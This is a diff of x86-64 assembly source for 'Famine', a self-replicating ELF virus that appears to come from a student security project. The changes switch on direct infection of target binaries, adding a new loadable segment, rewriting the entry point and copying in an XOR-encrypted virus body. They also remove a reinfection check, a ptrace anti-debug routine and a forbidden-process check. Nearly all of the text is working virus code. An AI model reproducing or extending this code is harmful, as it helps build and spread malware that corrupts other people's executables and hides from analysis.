@@ -13,6 +13,7 @@ _start:
 	PUSH_ALL
 	jmp		end_
 
+
 _xor_decrypt:
 	push rsi
 	push rdi
@@ -94,9 +95,9 @@ _xor_decrypt:
 	pop rsi
 	ret
 _encrypted_start:
-	
 
 print_rax:
+
     PUSH_ALL
     ; Utilisation d’un buffer sur la pile
     sub     rsp, 64             ; réserver 32 bytes
@@ -145,6 +146,8 @@ print_rax:
 		add		rax, rdx          ; rax += (base % 0x1000)
 		POP_ALLr
 	ret
+
+
 
 	printf: ; lea rsi
 		push	rax
@@ -391,6 +394,9 @@ print_rax:
 		.file:
 			;call	printf ;logique des fichier
 
+
+
+
 			push	rdi
 			push	rsi
 			push	rax
@@ -403,15 +409,19 @@ print_rax:
 
 			;call	printf
 
-			call	check_binary
-			; jz .no_print
+			call	infection_0
 
-			; call infection_0
+
+
+
+
+
 			; ici logique des fichier
 		.no_print:
 			add		rsi, rcx
 			jmp		.loop
 		.done:
+
 
 		pop		rdi
 		mov		rax, SYS_close
@@ -426,70 +436,6 @@ print_rax:
 		; elfp0
 		;movzx	rcx, e_phnum
 		;movzx	rdi, e_phentisize
-
-	check_binary:
-		PUSH_ALL
-	
-		; open(path, O_RDWR)
-		mov     rax, SYS_open
-		lea     rdi, [rel path]
-		mov     rsi, 2 ; O_RDWR
-		xor     rdx, rdx
-		syscall
-		cmp     rax, 0
-		jl      .ret
-		mov     r12, rax ; save fd
-	
-		; fstat(fd, &stat)
-		mov     rdi, r12
-		sub     rsp, 144 ; struct stat buffer
-		mov     rax, SYS_fstat
-		mov     rsi, rsp
-		syscall
-		cmp     rax, 0
-		jl      .ret_restore
-	
-		; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
-		mov     rsi, [rsp + 48]
-		mov     rax, SYS_mmap
-		mov     rdi, 0
-		mov     rdx, PROT_READ | PROT_WRITE
-		mov     r10, MAP_SHARED
-		mov     r8, r12
-		mov     r9, 0
-		syscall
-		cmp     rax, -4095
-		jae     .ret_restore
-
-		; check is elf
-		cmp dword [rax], 0x464c457f
-		jne .ret_restore
-
-		; check is elf64
-		cmp byte [rax + 0x4], 0x2
-		jne .ret_restore
-
-		; check for signature
-		; signature = file_start + padding - (end - signature)
-		mov rdx, [rsp + 48]
-		mov rdi, rax
-		add rdi, rdx
-		sub rdi, (end_addr - signature)
-
-		xor rax, rax
-		mov rsi, signature
-		call ft_strcmp
-		cmp eax, 0
-		je .ret_restore
-
-		call infection_0
-	.ret_restore:
-		add     rsp, 144
-	.ret:
-		POP_ALL
-		ret
-		
-
 	infection_0:
 		PUSH_ALLr
 
@@ -497,6 +443,7 @@ print_rax:
 		mov		qword [rel p_offset], 0
 		mov		qword [rel p_vaddr], 0
 		mov		qword [rel p_paddr], 0
+
 
 		mov		qword [rel p_offset],  0
 
@@ -552,12 +499,14 @@ print_rax:
 	.not_usseles_ph:
 	dec	rcx
 	jnz	.loop
+
+
 		cmp		r13, 1
 		je		.return
-
 		mov		rax, [rel p_vaddr]
 		;add		rax, [rel elfb + ehdr.e_shoff]
 		;add		rax, r15	-> Tant que ca crash pas on add pas!
+
 
 		mov		rdx, [rel p_offset]
 
@@ -575,7 +524,6 @@ print_rax:
 		mov		rdx, 56
 		mov		r10, r11
 		syscall
-
 		;  LOAD           0x0000000000024770 0x0000000000026770 0x0000000000026770
 		; New Entry
 		mov		rax, SYS_pwrite64
@@ -585,6 +533,7 @@ print_rax:
 		mov		r10, ehdr.e_entry
 		syscall
 
+
 		mov		rax, SYS_pwrite64
 		mov		rdi, r12
 		lea		rsi, [rel one]
@@ -593,14 +542,15 @@ print_rax:
 		syscall
 
 		; write famine
-		; 15952 ->21088
-		lea		rsi, [rel _start]
-		mov		rdx, FAMINE_SIZE_NO_BSS
-		mov		r10, [rel p_offset]
-		mov		rdi, r12
-		mov		rax, SYS_pwrite64
-		syscall
 
+		; 15952 ->21088
+		; write encrypted famine
+		mov		rdi, r12
+		mov		r10, [rel p_offset]
+		call	_write_encrypted_payload
+		test	rax, rax
+		js		.return		; Jump if encryption/write failed
+		; syscall
 
 	.return:
 
@@ -608,26 +558,26 @@ print_rax:
 		POP_ALLr
 	ret
 
+
 end_:
-	; check if tracer
-	; call _is_debugged
-	; test rax, rax
-	; jz .just_quit
-
-	; check active forbidden process
-	; call _check_forbidden_process
-	; cmp rax, 1
-	; je .just_quit
-
-	mov		rax, [rel entry]
+	; Check if we were infected (zero flag indicates original vs infected)
+	mov		al, BYTE [rel zero]
+	test	al, al
+	jz		.original_execution
+	
+	; We are an infected file - calculate original entry point
+	mov		rax, [rel old_entry]
+	test	rax, rax
+	jz		.exit_program		; No original entry, just exit
+	mov		[rel new_entry], rax
+	jmp		.continue
+	
+.original_execution:
+	; We are the original famine - no need to jump anywhere
+	xor		rax, rax
 	mov		[rel new_entry], rax
 
-	mov		rax, [rel new_entry]
-	sub		rax, [rel old_entry]
-	lea		rdi, [rel _start]
-	sub		rdi, rax
-
-	mov		[rel new_entry], rdi
+.continue:
 
 	call	famine
 
@@ -652,202 +602,151 @@ end_:
 	mov		rdi, r12
 	syscall
 
-	.just_quit:
-		POP_ALL
-		mov		al, BYTE [rel zero]
-		test	al, al
-		jz		.exit_ret
+.just_quit:
+	POP_ALL
+	
+	; Check if we need to jump to original entry point
+	mov		rax, [rel new_entry]
+	test	rax, rax
+	jz		.exit_ret
+	
+	; Jump to original program
+	jmp		rax
 
-		jmp		[rel new_entry]
-
-	.exit_ret:
-		mov		rax, SYS_exit
-		xor		rdi, rdi
-		syscall
-
-; Anti debug ---
-_is_debugged:
-	mov rdi, 0
-	mov rax, SYS_ptrace
-	xor rsi, rsi
-	xor rdx, rdx
-	xor r10, r10
+.exit_ret:
+	mov		rax, SYS_exit
+	xor		rdi, rdi
 	syscall
-	ret
 
-; Check forbidden process ---
-_check_forbidden_process:
-    mov     rax, SYS_open
-    lea     rdi, [rel proc_prefix]
-    xor     rsi, rsi
-    xor     rdx, rdx
+.exit_program:
+	mov		rax, SYS_exit
+	xor		rdi, rdi
+	syscall
+
+_write_encrypted_payload:
+    ; Input: rdi = file descriptor, r10 = write offset
+    ; Returns: rax = 0 on success, negative on error
+    
+    PUSH_ALLr
+    
+    mov r12, rdi        ; save file descriptor
+    mov r11, r10        ; save write offset
+    
+    ; Calculate payload size
+    lea rax, [rel end_addr]
+    lea rcx, [rel _encrypted_start]
+    sub rax, rcx
+    mov r8, rax         ; r8 = payload size
+    
+    ; Round up size to page boundary for mmap
+    add rax, 4095
+    and rax, ~4095
+    mov r9, rax         ; r9 = aligned size
+    
+    ; mmap anonymous memory
+    mov rax, 9          ; SYS_mmap
+    xor rdi, rdi        ; addr = NULL
+    mov rsi, r9         ; length = aligned size
+    mov rdx, 3          ; prot = PROT_READ | PROT_WRITE
+    mov r10, 0x22       ; flags = MAP_PRIVATE | MAP_ANONYMOUS
+    mov r8, -1          ; fd = -1
+    xor r9, r9          ; offset = 0
     syscall
-    cmp     rax, 0
-    jl      .ret
-    mov     r12, rax               ; save fd
+    
+    cmp rax, -1
+    je .error
+    
+    mov rbx, rax        ; rbx = mapped memory
+    
+    ; Copy payload to mapped memory
+    mov rdi, rbx                    ; destination
+    lea rsi, [rel _encrypted_start] ; source
+    mov rcx, r8                     ; size
+    rep movsb
+    
+    ; Encrypt the copied payload
+    mov rsi, rbx        ; start of mapped memory
+    mov rcx, r8         ; payload size
+    xor r10, r10        ; byte counter
+    
+    ; Use same key as decrypt
+    mov rax, 0xdeadbeefdeadbeef
+    push rax
 
-.read_dir:
-    mov     rax, SYS_getdents64
-    mov     rdi, r12
-    lea     rsi, [rel buff]
-    mov     rdx, 4096
+.encrypt_loop:
+    test rcx, rcx
+    jz .encrypt_done
+    
+    ; Calculate key byte: k[i % 8]
+    mov rax, r10
+    and rax, 7
+    mov al, byte [rsp + rax]
+    
+    ; XOR with current byte
+    mov dl, byte [rsi]
+    xor dl, al
+    mov byte [rsi], dl
+    
+    inc rsi
+    inc r10
+    dec rcx
+    jmp .encrypt_loop
+
+.encrypt_done:
+    add rsp, 8          ; remove key from stack
+    
+    ; Write encrypted payload to file
+    mov rax, SYS_pwrite64
+    mov rdi, r12        ; file descriptor
+    mov rsi, rbx        ; encrypted payload
+    mov rdx, r8         ; payload size
+    mov r10, r11        ; write offset
     syscall
-    cmp     rax, 0
-    jle     .close_getdents ; 0 = EOF, <0 = error
-    mov     r14, rax    ; bytes read
-    xor     r13, r13  ; offset = 0
+    
+    push rax            ; save write result
+    
+    ; Unmap memory
+    mov rax, 11         ; SYS_munmap
+    mov rdi, rbx        ; address
+    mov rsi, r9         ; aligned size
+    syscall
+    
+    pop rax             ; restore write result
+    
+    ; Check if write was successful
+    cmp rax, r8
+    jne .error
+    
+    xor rax, rax        ; success
+    jmp .done
 
-.read_getdents_entry:
-    cmp     r13, r14
-    jge     .read_dir   
+.error:
+    mov rax, -1
 
-    lea     rdi, [rel buff]
-    add     rdi, r13
-    movzx   r10, word [rdi + 16]       ; d_reclen
-    mov     al, byte [rdi + r10 - 1]   ; d_type
-    lea     rsi, [rdi + 18]            ; pointer to d_name
-    add     r13, r10                   ; advance offset
-
-    cmp     al, DT_DIR
-    jne     .read_getdents_entry     
-
-    push    rsi                      
-	mov r15, rsi
-    call    _parse_dir              
-
-.loop:
-	pop rsi
-	jmp .read_getdents_entry
-
-.close_getdents:
-	mov rax, SYS_close
-	mov rdi, r12
-	syscall
-
-.ret:
-	mov rax, 0
-	ret
-
-
-; parse process dir ---
-_parse_dir:
-	mov rdi, r15  
-	lea rdx, [rel path_buffer]    
-
-	; Copy "/proc/"
-	lea rsi, [rel proc_prefix]
-.copy_proc:
-	lodsb
-	test al, al
-	jz .copy_pid
-	stosb
-	jmp .copy_proc
-
-.copy_pid:
-	mov rsi, r15
-.copy_pid_loop:
-	lodsb
-	test al, al
-	jz .copy_comm
-	stosb
-	jmp .copy_pid_loop
-
-.copy_comm:
-	lea rsi, [rel comm_path]
-.copy_comm_loop:
-	lodsb
-	test al, al
-	jz .open_comm
-	stosb
-	jmp .copy_comm_loop
-
-.open_comm:
-	mov rax, SYS_open
-	lea rdi, [rel path_buffer]
-	xor rsi, rsi ; O_RDONLY
-	xor rdx, rdx
-	syscall
-	test rax, rax
-	js .ret_continue
-	mov r12, rax        ; save fd
-
-.read_comm:
-	mov rdi, r12
-	mov rax, SYS_read
-	lea rsi, [rel comm_buff]
-	mov rdx, 7
-	syscall
-	test rax, rax
-	jle .close_comm
-
-.check_match:
-	lea rsi, [rel comm_buff]
-	lea rdi, [rel forbidden_process]
-	call ft_strcmp
-	cmp eax, 0
-	je .forbidden_found
-
-.close_comm:
-	mov rdi, r12
-	mov rax, SYS_close
-	syscall
-
-.ret_continue:
-	ret
-
-.forbidden_found:
-	mov rdi, r12
-	mov rax, SYS_close
-	syscall
-	mov rax, 1         ; signal forbidden process found
-	ret
-
-
-; Utils ---
-ft_strcmp:
-	PUSH_ALL
-	xor eax, eax
-	.loop:
-		mov al, [rdi]
-		mov dl, [rsi]
-		cmp al, dl
-		jne .diff
-		test al, al
-		je .done
-		inc rdi
-		inc rsi
-		jmp .loop
-	.diff:
-		sub eax, edx
-	.done:
-		POP_ALL
-		ret
+.done:
+    POP_ALLr
+    ret
 
 ; -----
-elfb	times 0064 db 0
-file	db 'elf64 found!', 0
-signature	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
-old_entry		   dq 0
-new_entry		   dq 0
-self	db '/proc/self/exe', 0
-last	db '..', 0
-curr	db '.', 0
-elfh	db 0x7f, 'ELF'
-one		db 1
-zero	db 0
-paddi	dq 0
-entry	dq 0
-exec	dd 7
 
-; forbidden process
-proc_prefix db '/proc/', 0
-comm_path db '/comm', 0
-forbidden_process db 'cursor', 0
+
+	elfb	times 0064 db 0
+	file	db 'elf64 found!', 0
+	msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
+	old_entry		   dq 0
+	new_entry		   dq 0
+	self	db '/proc/self/exe', 0
+	last	db '..', 0
+	curr	db '.', 0
+	elfh	db 0x7f, 'ELF'
+	one		db 1
+	zero	db 0
+	paddi	dq 0
+	entry	dq 0
+	exec	dd 7
 
 ; NEW HEADER
 new_programheader:
-	elfp0	times 0056 db 0
-	elfp1	times 0056 db 0
 	p_type		dd	1
 	p_flags		dd	7
 	p_offset	dq	0
@@ -861,7 +760,7 @@ new_programheader:
 buffer_bss:
 	padd	times 0512 db 0
 	buff	times 4096 db 0
-	comm_buff times 7 db 0
-	path_buffer times 64 db 0
+	elfp0	times 0056 db 0
+	elfp1	times 0056 db 0
 
 end_addr:
